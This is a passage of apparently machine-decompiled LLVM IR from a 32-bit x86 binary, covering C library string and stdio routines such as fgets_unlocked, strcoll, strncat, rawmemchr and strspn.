  %v0_804cefd = phi i32 [ %v0_804cecc, %dec_label_pc_804cec3 ], [ %v1_804ceed.pre, %dec_label_pc_804cecc ]
  %v0_804ceeb = load i32, i32* @ebp, align 4
  %v2_804ceed = inttoptr i32 %v0_804cefd to i32*
  %v3_804ceed = load i32, i32* %v2_804ceed, align 4
  %v4_804ceed = or i32 %v3_804ceed, %v0_804ceeb
  %v2_804ceef = urem i32 %v4_804ceed, 65536
  %v9_804ceef = and i32 %v2_804ceef, 832
  %v2_804cef3 = icmp eq i32 %v9_804ceef, 320
  %v1_804cef8 = icmp eq i1 %v2_804cef3, false
  br i1 %v1_804cef8, label %dec_label_pc_804cf19, label %dec_label_pc_804cefa

dec_label_pc_804cefa:                             ; preds = %dec_label_pc_804ceeb
  %v1_804cefe = call i32 @__stdio_wcommit(i32 %v0_804cefd)
  %v1_804cf06 = icmp eq i32 %v1_804cefe, 0
  br i1 %v1_804cf06, label %dec_label_pc_804cf0f, label %dec_label_pc_804cf0a

dec_label_pc_804cf0a:                             ; preds = %dec_label_pc_804cefa
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804cf19

dec_label_pc_804cf0f:                             ; preds = %dec_label_pc_804cefa
  %v0_804cf0f = load i32, i32* @esi, align 4
  %v1_804cf0f = inttoptr i32 %v0_804cf0f to i16*
  %v2_804cf0f = load i16, i16* %v1_804cf0f, align 2
  %v3_804cf0f = and i16 %v2_804cf0f, -65
  store i16 %v3_804cf0f, i16* %v1_804cf0f, align 2
  %v0_804cf13 = load i32, i32* @esi, align 4
  %v1_804cf13 = add i32 %v0_804cf13, 8
  %v2_804cf13 = inttoptr i32 %v1_804cf13 to i32*
  %v3_804cf13 = load i32, i32* %v2_804cf13, align 4
  %v2_804cf16 = add i32 %v0_804cf13, 28
  %v3_804cf16 = inttoptr i32 %v2_804cf16 to i32*
  store i32 %v3_804cf13, i32* %v3_804cf16, align 4
  br label %dec_label_pc_804cf19

dec_label_pc_804cf19:                             ; preds = %dec_label_pc_804ceeb, %dec_label_pc_804cf0a, %dec_label_pc_804cf0f
  %v0_804cf19 = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804cf19 = icmp eq i32 %v0_804cf19, 2
  br i1 %v9_804cf19, label %dec_label_pc_804cf33, label %dec_label_pc_804cf22

dec_label_pc_804cf22:                             ; preds = %dec_label_pc_804cf19
  store i32 %v2_804ce5f, i32* @eax, align 4
  %v2_804cf2b = call i32 @__pthread_return_void(i32 %v2_804ce5f, i32 1)
  br label %dec_label_pc_804cf33

dec_label_pc_804cf33:                             ; preds = %dec_label_pc_804cf19, %dec_label_pc_804cebe, %dec_label_pc_804cf22
  %v0_804cf33 = load i32, i32* @esi, align 4
  %v1_804cf33 = add i32 %v0_804cf33, 32
  %v2_804cf33 = inttoptr i32 %v1_804cf33 to i32*
  %v3_804cf33 = load i32, i32* %v2_804cf33, align 4
  store i32 %v3_804cf33, i32* @esi, align 4
  %v1_804cf36 = icmp eq i32 %v3_804cf33, 0
  %v1_804cf38 = icmp eq i1 %v1_804cf36, false
  br i1 %v1_804cf38, label %dec_label_pc_804cebe, label %dec_label_pc_804cf3a

dec_label_pc_804cf3a:                             ; preds = %dec_label_pc_804cf33, %dec_label_pc_804ce52
  %v0_804cf3a = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804cf67

dec_label_pc_804cf41:                             ; preds = %dec_label_pc_804ce45
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804cf43 = load i8, i8* %tmp23, align 1
  %v4_804cf43 = and i8 %v3_804cf43, 64
  %v5_804cf43 = icmp eq i8 %v4_804cf43, 0
  br i1 %v5_804cf43, label %dec_label_pc_804cf67, label %dec_label_pc_804cf48

dec_label_pc_804cf48:                             ; preds = %dec_label_pc_804cf41
  store i32 -1, i32* @edi, align 4
  %v1_804cf4f = call i32 @__stdio_wcommit(i32 %v4_804ce39)
  %v1_804cf57 = icmp eq i32 %v1_804cf4f, 0
  %v1_804cf59 = icmp eq i1 %v1_804cf57, false
  br i1 %v1_804cf59, label %dec_label_pc_804cf67, label %dec_label_pc_804cf5b

dec_label_pc_804cf5b:                             ; preds = %dec_label_pc_804cf48
  %v3_804cf5b = load i16, i16* %arg1, align 2
  %v4_804cf5b = and i16 %v3_804cf5b, -65
  store i16 %v4_804cf5b, i16* %arg1, align 2
  %v2_804cf5f = add i32 %v4_804ce39, 8
  %v3_804cf5f = inttoptr i32 %v2_804cf5f to i32*
  %v4_804cf5f = load i32, i32* %v3_804cf5f, align 4
  %v3_804cf62 = add i32 %v4_804ce39, 28
  %v4_804cf62 = inttoptr i32 %v3_804cf62 to i32*
  store i32 %v4_804cf5f, i32* %v4_804cf62, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804cf67

dec_label_pc_804cf67:                             ; preds = %dec_label_pc_804cf48, %dec_label_pc_804cf41, %dec_label_pc_804cf3a, %dec_label_pc_804cf5b
  %v0_804cf6a = load i32, i32* @edi, align 4
  store i32 %v0_804ce33, i32* @ebx, align 4
  store i32 %v0_804ce32, i32* @esi, align 4
  store i32 %v0_804ce31, i32* @edi, align 4
  store i32 %v0_804ce30, i32* @ebp, align 4
  ret i32 %v0_804cf6a

; uselistorder directives
  uselistorder i32 %v3_804cf33, { 1, 2, 0 }
  uselistorder i32 %v2_804ce5f, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805218c.104 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8052548.99, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80521a8.98 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804cf67, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cf33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cf19, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ceeb, { 1, 0 }
  uselistorder label %dec_label_pc_804cebe, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804cf74 = load i32, i32* @ebp, align 4
  %v4_804cf7b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804cf7b, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804cf7b, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804cfc5.preheader, label %dec_label_pc_804cfd1

dec_label_pc_804cfc5.preheader:                   ; preds = %entry
  %v1_804cfc519 = add i32 %arg2, -1
  %v8_804cfc520 = icmp eq i32 %v1_804cfc519, 0
  store i32 %v1_804cfc519, i32* @esi, align 4
  %v1_804cfc621 = icmp eq i1 %v8_804cfc520, false
  br i1 %v1_804cfc621, label %dec_label_pc_804cf8f, label %dec_label_pc_804cfc8

dec_label_pc_804cf8f:                             ; preds = %dec_label_pc_804cfc5.preheader, %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge
  %v0_804cf8f = phi i32 [ %v0_804cf8f.pre, %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge ], [ %arg3, %dec_label_pc_804cfc5.preheader ]
  %v1_804cf8f = add i32 %v0_804cf8f, 16
  %v2_804cf8f = inttoptr i32 %v1_804cf8f to i32*
  %v3_804cf8f = load i32, i32* %v2_804cf8f, align 4
  store i32 %v3_804cf8f, i32* %eax.global-to-local, align 4
  %v2_804cf92 = add i32 %v0_804cf8f, 24
  %v3_804cf92 = inttoptr i32 %v2_804cf92 to i32*
  %v4_804cf92 = load i32, i32* %v3_804cf92, align 4
  %v10_804cf92 = icmp ult i32 %v3_804cf8f, %v4_804cf92
  %v1_804cf95 = icmp eq i1 %v10_804cf92, false
  br i1 %v1_804cf95, label %dec_label_pc_804cfa5, label %dec_label_pc_804cf97

dec_label_pc_804cf97:                             ; preds = %dec_label_pc_804cf8f
  %v1_804cf97 = inttoptr i32 %v3_804cf8f to i8*
  %v2_804cf97 = load i8, i8* %v1_804cf97, align 1
  %v3_804cf97 = zext i8 %v2_804cf97 to i32
  %v4_804cf97 = load i32, i32* @edx, align 4
  %v5_804cf97 = and i32 %v4_804cf97, -256
  %v6_804cf97 = or i32 %v5_804cf97, %v3_804cf97
  store i32 %v6_804cf97, i32* @edx, align 4
  %v1_804cf99 = add i32 %v3_804cf8f, 1
  store i32 %v1_804cf99, i32* %eax.global-to-local, align 4
  %v2_804cf9a = load i32, i32* @ebx, align 4
  %v3_804cf9a = inttoptr i32 %v2_804cf9a to i8*
  store i8 %v2_804cf97, i8* %v3_804cf9a, align 1
  %v0_804cf9c = load i32, i32* @ebx, align 4
  %v1_804cf9c = add i32 %v0_804cf9c, 1
  store i32 %v1_804cf9c, i32* @ebx, align 4
  %v0_804cf9d = load i32, i32* @edx, align 4
  %v1_804cf9d = trunc i32 %v0_804cf9d to i8
  %v10_804cf9d = icmp eq i8 %v1_804cf9d, 10
  %v0_804cfa0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cfa0 = load i32, i32* @ebp, align 4
  %v2_804cfa0 = add i32 %v1_804cfa0, 16
  %v3_804cfa0 = inttoptr i32 %v2_804cfa0 to i32*
  store i32 %v0_804cfa0, i32* %v3_804cfa0, align 4
  br i1 %v10_804cf9d, label %dec_label_pc_804cfc8, label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge

dec_label_pc_804cfa5:                             ; preds = %dec_label_pc_804cf8f
  %v0_804cfa9 = call i32 @getc_unlocked()
  %v1_804cfa9 = trunc i32 %v0_804cfa9 to i8
  store i32 %v0_804cfa9, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804cfa9, 256
  %v11_804cfb1 = icmp eq i32 %sext.mask, 255
  %v1_804cfb4 = icmp eq i1 %v11_804cfb1, false
  br i1 %v1_804cfb4, label %dec_label_pc_804cfc3, label %dec_label_pc_804cfb6

dec_label_pc_804cfb6:                             ; preds = %dec_label_pc_804cfa5
  %v0_804cfb6 = load i32, i32* @ebp, align 4
  %v1_804cfb6 = inttoptr i32 %v0_804cfb6 to i8*
  %v2_804cfb6 = load i8, i8* %v1_804cfb6, align 1
  %v3_804cfb6 = and i8 %v2_804cfb6, 8
  %v4_804cfb6 = icmp eq i8 %v3_804cfb6, 0
  br i1 %v4_804cfb6, label %dec_label_pc_804cfc8, label %dec_label_pc_804cfd1

dec_label_pc_804cfc3:                             ; preds = %dec_label_pc_804cfa5
  %v3_804cfbe = load i32, i32* @ebx, align 4
  %v4_804cfbe = inttoptr i32 %v3_804cfbe to i8*
  store i8 %v1_804cfa9, i8* %v4_804cfbe, align 1
  %v0_804cfc0 = load i32, i32* @ebx, align 4
  %v1_804cfc0 = add i32 %v0_804cfc0, 1
  store i32 %v1_804cfc0, i32* @ebx, align 4
  %v11_804cfc1 = icmp eq i8 %v1_804cfa9, 10
  br i1 %v11_804cfc1, label %dec_label_pc_804cfc8, label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge

dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge: ; preds = %dec_label_pc_804cf97, %dec_label_pc_804cfc3
  %v0_804cfc5.pre = load i32, i32* @esi, align 4
  %v1_804cfc5 = add i32 %v0_804cfc5.pre, -1
  %v8_804cfc5 = icmp eq i32 %v1_804cfc5, 0
  store i32 %v1_804cfc5, i32* @esi, align 4
  %v1_804cfc6 = icmp eq i1 %v8_804cfc5, false
  br i1 %v1_804cfc6, label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge, label %dec_label_pc_804cfc8

dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge.dec_label_pc_804cf8f_crit_edge: ; preds = %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge
  %v0_804cf8f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804cf8f

dec_label_pc_804cfc8:                             ; preds = %dec_label_pc_804cfc5.preheader, %dec_label_pc_804cf97, %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge, %dec_label_pc_804cfc3, %dec_label_pc_804cfb6
  %v0_804cfc8 = load i32, i32* @ebx, align 4
  %v1_804cfc8 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804cfc8, %v1_804cfc8
  br i1 %tmp23, label %dec_label_pc_804cfcc, label %dec_label_pc_804cfd1

dec_label_pc_804cfcc:                             ; preds = %dec_label_pc_804cfc8
  %v1_804cfcc = inttoptr i32 %v0_804cfc8 to i8*
  store i8 0, i8* %v1_804cfcc, align 1
  %v0_804cfd6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804cfd3

dec_label_pc_804cfd1:                             ; preds = %dec_label_pc_804cfc8, %dec_label_pc_804cfb6, %entry
  br label %dec_label_pc_804cfd3

dec_label_pc_804cfd3:                             ; preds = %dec_label_pc_804cfcc, %dec_label_pc_804cfd1
  %v0_804cfd6 = phi i32 [ %v0_804cfd6.pre, %dec_label_pc_804cfcc ], [ 0, %dec_label_pc_804cfd1 ]
  store i32 %v0_804cfd6, i32* %eax.global-to-local, align 4
  store i32 %v0_804cf74, i32* @ebp, align 4
  ret i32 %v0_804cfd6

; uselistorder directives
  uselistorder i32 %v0_804cfd6, { 1, 0 }
  uselistorder i32 %v0_804cfc8, { 1, 0 }
  uselistorder i32 %v1_804cfc5, { 1, 0 }
  uselistorder i32 %v0_804cfa9, { 0, 2, 1 }
  uselistorder i32 %v0_804cf8f, { 1, 0 }
  uselistorder label %dec_label_pc_804cfd3, { 1, 0 }
  uselistorder label %dec_label_pc_804cfc8, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804cfc3.dec_label_pc_804cfc5_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804cf8f, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804cfe2 = ptrtoint i8* %arg1 to i32
  %v4_804cfea.pre = load i32, i32* @eax, align 4
  %v8_804cfea.pre = load i1, i1* @df, align 1
  %v9_804cfea = select i1 %v8_804cfea.pre, i32 -1, i32 1
  br label %dec_label_pc_804cfea

dec_label_pc_804cfea:                             ; preds = %dec_label_pc_804cfee, %entry
  %v20_804cfeb = phi i32 [ %v23_804cfeb, %dec_label_pc_804cfee ], [ %arg2, %entry ]
  %v4_804cfea = phi i32 [ %v6_804cfea, %dec_label_pc_804cfee ], [ %v4_804cfea.pre, %entry ]
  %v7_804cfea = phi i32 [ %v10_804cfea, %dec_label_pc_804cfee ], [ %v4_804cfe2, %entry ]
  %v1_804cfea = inttoptr i32 %v7_804cfea to i8*
  %v2_804cfea = load i8, i8* %v1_804cfea, align 1
  %v3_804cfeb = inttoptr i32 %v20_804cfeb to i8*
  %v4_804cfeb = load i8, i8* %v3_804cfeb, align 1
  %v15_804cfeb = icmp eq i8 %v2_804cfea, %v4_804cfeb
  %v1_804cfec = icmp eq i1 %v15_804cfeb, false
  br i1 %v1_804cfec, label %dec_label_pc_804cff6, label %dec_label_pc_804cfee

dec_label_pc_804cfee:                             ; preds = %dec_label_pc_804cfea
  %v3_804cfea = zext i8 %v2_804cfea to i32
  %v5_804cfea = and i32 %v4_804cfea, -256
  %v6_804cfea = or i32 %v3_804cfea, %v5_804cfea
  %v23_804cfeb = add i32 %v20_804cfeb, %v9_804cfea
  %v10_804cfea = add i32 %v7_804cfea, %v9_804cfea
  %v4_804cfee = icmp eq i8 %v2_804cfea, 0
  %v1_804cff0 = icmp eq i1 %v4_804cfee, false
  br i1 %v1_804cff0, label %dec_label_pc_804cfea, label %dec_label_pc_804cffa

dec_label_pc_804cff6:                             ; preds = %dec_label_pc_804cfea
  br label %dec_label_pc_804cffa

dec_label_pc_804cffa:                             ; preds = %dec_label_pc_804cfee, %dec_label_pc_804cff6
  %storemerge = phi i32 [ 1, %dec_label_pc_804cff6 ], [ 0, %dec_label_pc_804cfee ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804cfea, { 1, 2, 0 }
  uselistorder i32 %v9_804cfea, { 1, 0 }
  uselistorder label %dec_label_pc_804cffa, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d015 = load i32, i32* @esi, align 4
  store i32 %v0_804d015, i32* %stack_var_-8, align 4
  %v4_804d016 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_804d016, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_804d023 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_804d027 = call i32 @_strlen(i8* %v4_804d023)
  %v2_804d029 = add i32 %tmp, -1
  store i32 %v2_804d029, i32* %edi.global-to-local, align 4
  %v0_804d02a = load i32, i32* %edx.global-to-local, align 4
  %v8_804d02d10 = icmp eq i32 %v0_804d02a, 0
  store i32 %v0_804d02a, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d02d10, label %dec_label_pc_804d038, label %dec_label_pc_804d030.lr.ph

dec_label_pc_804d030.lr.ph:                       ; preds = %entry
  %v4_804d030.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_804d030.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804d030

dec_label_pc_804d030:                             ; preds = %dec_label_pc_804d030.lr.ph, %dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge
  %v8_804d030 = phi i1 [ %v8_804d030.pre, %dec_label_pc_804d030.lr.ph ], [ %v5_804d031, %dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge ]
  %v4_804d030 = phi i32 [ %v4_804d030.pre, %dec_label_pc_804d030.lr.ph ], [ %v0_804d032, %dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge ]
  %v2_804d03a11 = phi i32 [ %v2_804d029, %dec_label_pc_804d030.lr.ph ], [ %v7_804d031, %dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge ]
  %v0_804d030 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d030 = inttoptr i32 %v0_804d030 to i8*
  %v2_804d030 = load i8, i8* %v1_804d030, align 1
  %v3_804d030 = zext i8 %v2_804d030 to i32
  %v5_804d030 = and i32 %v4_804d030, -256
  %v6_804d030 = or i32 %v5_804d030, %v3_804d030
  store i32 %v6_804d030, i32* %eax.global-to-local, align 4
  %v9_804d030 = select i1 %v8_804d030, i32 -1, i32 1
  %v10_804d030 = add i32 %v9_804d030, %v0_804d030
  store i32 %v10_804d030, i32* %esi.global-to-local, align 4
  %v3_804d031 = inttoptr i32 %v2_804d03a11 to i8*
  store i8 %v2_804d030, i8* %v3_804d031, align 1
  %v4_804d031 = load i32, i32* %edi.global-to-local, align 4
  %v5_804d031 = load i1, i1* @df, align 1
  %v6_804d031 = select i1 %v5_804d031, i32 -1, i32 1
  %v7_804d031 = add i32 %v6_804d031, %v4_804d031
  store i32 %v7_804d031, i32* %edi.global-to-local, align 4
  %v0_804d032 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d032 = trunc i32 %v0_804d032 to i8
  %v4_804d032 = icmp eq i8 %v3_804d032, 0
  %v1_804d034 = icmp eq i1 %v4_804d032, false
  br i1 %v1_804d034, label %dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge, label %dec_label_pc_804d03b

dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge: ; preds = %dec_label_pc_804d030
  %v0_804d02d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d02d = add i32 %v0_804d02d.pre, -1
  %v8_804d02d = icmp eq i32 %v1_804d02d, 0
  store i32 %v1_804d02d, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d02d, label %dec_label_pc_804d038, label %dec_label_pc_804d030

dec_label_pc_804d038:                             ; preds = %dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge, %entry
  %v2_804d03a.lcssa = phi i32 [ %v2_804d029, %entry ], [ %v7_804d031, %dec_label_pc_804d030.dec_label_pc_804d02d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804d03a = inttoptr i32 %v2_804d03a.lcssa to i8*
  store i8 0, i8* %v3_804d03a, align 1
  %v4_804d03a = load i32, i32* %edi.global-to-local, align 4
  %v5_804d03a = load i1, i1* @df, align 1
  %v6_804d03a = select i1 %v5_804d03a, i32 -1, i32 1
  %v7_804d03a = add i32 %v6_804d03a, %v4_804d03a
  store i32 %v7_804d03a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d03b

dec_label_pc_804d03b:                             ; preds = %dec_label_pc_804d030, %dec_label_pc_804d038
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_804d03f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d03f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_804d02d, { 1, 0 }
  uselistorder i32 %v0_804d032, { 1, 0 }
  uselistorder i32 %v7_804d031, { 0, 2, 1 }
  uselistorder i1 %v5_804d031, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804d03b, { 1, 0 }
  uselistorder label %dec_label_pc_804d030, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804d045 = load i32, i32* @ebx, align 4
  %v4_804d046 = urem i32 %arg2, 256
  %v4_804d04a = ptrtoint i8* %arg1 to i32
  %v2_804d0553 = urem i32 %v4_804d04a, 4
  %v3_804d0554 = icmp eq i32 %v2_804d0553, 0
  %v1_804d0578 = icmp eq i1 %v3_804d0554, false
  %v4_804d050 = trunc i32 %arg2 to i8
  br i1 %v1_804d0578, label %dec_label_pc_804d050, label %dec_label_pc_804d059

dec_label_pc_804d050:                             ; preds = %entry, %dec_label_pc_804d054
  %v0_804d054 = phi i32 [ %v1_804d054, %dec_label_pc_804d054 ], [ %v4_804d04a, %entry ]
  %v1_804d050 = inttoptr i32 %v0_804d054 to i8*
  %v2_804d050 = load i8, i8* %v1_804d050, align 1
  %v15_804d050 = icmp eq i8 %v2_804d050, %v4_804d050
  br i1 %v15_804d050, label %dec_label_pc_804d0a4, label %dec_label_pc_804d054

dec_label_pc_804d054:                             ; preds = %dec_label_pc_804d050
  %v1_804d054 = add i32 %v0_804d054, 1
  %v2_804d055 = urem i32 %v1_804d054, 4
  %v3_804d055 = icmp eq i32 %v2_804d055, 0
  %v1_804d057 = icmp eq i1 %v3_804d055, false
  br i1 %v1_804d057, label %dec_label_pc_804d050, label %dec_label_pc_804d059

dec_label_pc_804d059:                             ; preds = %entry, %dec_label_pc_804d054
  %v0_804d05c = phi i32 [ %v1_804d054, %dec_label_pc_804d054 ], [ %v4_804d04a, %entry ]
  %v2_804d060 = mul nuw nsw i32 %v4_804d046, 256
  %v2_804d063 = or i32 %v2_804d060, %v4_804d046
  %v2_804d067 = mul i32 %v2_804d063, 65536
  %v2_804d06a = or i32 %v2_804d067, %v2_804d063
  br label %dec_label_pc_804d06c

dec_label_pc_804d06c:                             ; preds = %dec_label_pc_804d09c, %dec_label_pc_804d06c, %dec_label_pc_804d059
  %v0_804d070 = phi i32 [ %v0_804d05c, %dec_label_pc_804d059 ], [ %v1_804d070, %dec_label_pc_804d06c ], [ %v1_804d070, %dec_label_pc_804d09c ]
  %v2_804d06e = inttoptr i32 %v0_804d070 to i32*
  %v3_804d06e = load i32, i32* %v2_804d06e, align 4
  %v4_804d06e = xor i32 %v3_804d06e, %v2_804d06a
  %v1_804d070 = add i32 %v0_804d070, 4
  store i32 %v1_804d070, i32* @ecx, align 4
  %v1_804d073 = add i32 %v4_804d06e, 2130640639
  %v1_804d079 = sub i32 -1, %v4_804d06e
  store i32 %v1_804d079, i32* @edx, align 4
  %v2_804d07b = xor i32 %v1_804d073, %v1_804d079
  %v1_804d07d = and i32 %v2_804d07b, -2130640640
  %v2_804d07d = icmp eq i32 %v1_804d07d, 0
  br i1 %v2_804d07d, label %dec_label_pc_804d06c, label %dec_label_pc_804d084

dec_label_pc_804d084:                             ; preds = %dec_label_pc_804d06c
  %v2_804d087 = inttoptr i32 %v0_804d070 to i8*
  %v3_804d087 = load i8, i8* %v2_804d087, align 1
  %v16_804d087 = icmp eq i8 %v3_804d087, %v4_804d050
  br i1 %v16_804d087, label %dec_label_pc_804d0a4, label %dec_label_pc_804d08c

dec_label_pc_804d08c:                             ; preds = %dec_label_pc_804d084
  %v1_804d08c = add i32 %v0_804d070, 1
  %v2_804d08f = inttoptr i32 %v1_804d08c to i8*
  %v3_804d08f = load i8, i8* %v2_804d08f, align 1
  %v16_804d08f = icmp eq i8 %v3_804d08f, %v4_804d050
  br i1 %v16_804d08f, label %dec_label_pc_804d0a4, label %dec_label_pc_804d094

dec_label_pc_804d094:                             ; preds = %dec_label_pc_804d08c
  %v1_804d094 = add i32 %v0_804d070, 2
  %v2_804d097 = inttoptr i32 %v1_804d094 to i8*
  %v3_804d097 = load i8, i8* %v2_804d097, align 1
  %v16_804d097 = icmp eq i8 %v3_804d097, %v4_804d050
  br i1 %v16_804d097, label %dec_label_pc_804d0a4, label %dec_label_pc_804d09c

dec_label_pc_804d09c:                             ; preds = %dec_label_pc_804d094
  %v1_804d09c = add i32 %v0_804d070, 3
  %v2_804d09f = inttoptr i32 %v1_804d09c to i8*
  %v3_804d09f = load i8, i8* %v2_804d09f, align 1
  %v16_804d09f = icmp eq i8 %v3_804d09f, %v4_804d050
  %v1_804d0a2 = icmp eq i1 %v16_804d09f, false
  br i1 %v1_804d0a2, label %dec_label_pc_804d06c, label %dec_label_pc_804d0a4

dec_label_pc_804d0a4:                             ; preds = %dec_label_pc_804d050, %dec_label_pc_804d09c, %dec_label_pc_804d094, %dec_label_pc_804d08c, %dec_label_pc_804d084
  %v0_804d0a6 = phi i32 [ %v1_804d09c, %dec_label_pc_804d09c ], [ %v1_804d094, %dec_label_pc_804d094 ], [ %v1_804d08c, %dec_label_pc_804d08c ], [ %v0_804d070, %dec_label_pc_804d084 ], [ %v0_804d054, %dec_label_pc_804d050 ]
  store i32 %v0_804d045, i32* @ebx, align 4
  ret i32 %v0_804d0a6

; uselistorder directives
  uselistorder i32 %v1_804d079, { 1, 0 }
  uselistorder i32 %v1_804d070, { 2, 1, 0 }
  uselistorder i32 %v2_804d063, { 1, 0 }
  uselistorder i32 %v1_804d054, { 1, 0, 2 }
  uselistorder i32 %v4_804d04a, { 2, 1, 0 }
  uselistorder i32 %v4_804d046, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804d0a4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804d059, { 1, 0 }
  uselistorder label %dec_label_pc_804d050, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_804d0ca30 = load i8, i8* %arg1, align 1
  %v4_804d0cc34 = icmp eq i8 %v2_804d0ca30, 0
  br i1 %v4_804d0cc34, label %dec_label_pc_804d0d4, label %dec_label_pc_804d0d0.lr.ph

dec_label_pc_804d0d0.lr.ph:                       ; preds = %entry
  %v3_804d0ca31 = zext i8 %v2_804d0ca30 to i32
  %v4_804d0ca.pre = load i32, i32* @eax, align 4
  %v5_804d0ca32 = and i32 %v4_804d0ca.pre, -256
  %v6_804d0ca33 = or i32 %v3_804d0ca31, %v5_804d0ca32
  %v4_804d0b1 = ptrtoint i8* %arg1 to i32
  %v1_804d0bc18 = inttoptr i32 %arg2 to i8*
  %v4_804d0bc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804d0d0

dec_label_pc_804d0b7:                             ; preds = %dec_label_pc_804d0d0, %dec_label_pc_804d0bb
  %v6_804d0bc27 = phi i32 [ %v6_804d0bc, %dec_label_pc_804d0bb ], [ %v6_804d0bc22, %dec_label_pc_804d0d0 ]
  %v2_804d0bc26 = phi i8 [ %v2_804d0bc, %dec_label_pc_804d0bb ], [ %v2_804d0bc19, %dec_label_pc_804d0d0 ]
  %v0_804d0bb25 = phi i32 [ %v1_804d0bb, %dec_label_pc_804d0bb ], [ %arg2, %dec_label_pc_804d0d0 ]
  %v15_804d0b7 = icmp eq i8 %v2_804d0ca37, %v2_804d0bc26
  br i1 %v15_804d0b7, label %dec_label_pc_804d0c4, label %dec_label_pc_804d0bb

dec_label_pc_804d0bb:                             ; preds = %dec_label_pc_804d0b7
  %v1_804d0bb = add i32 %v0_804d0bb25, 1
  store i32 %v1_804d0bb, i32* @edx, align 4
  %v1_804d0bc = inttoptr i32 %v1_804d0bb to i8*
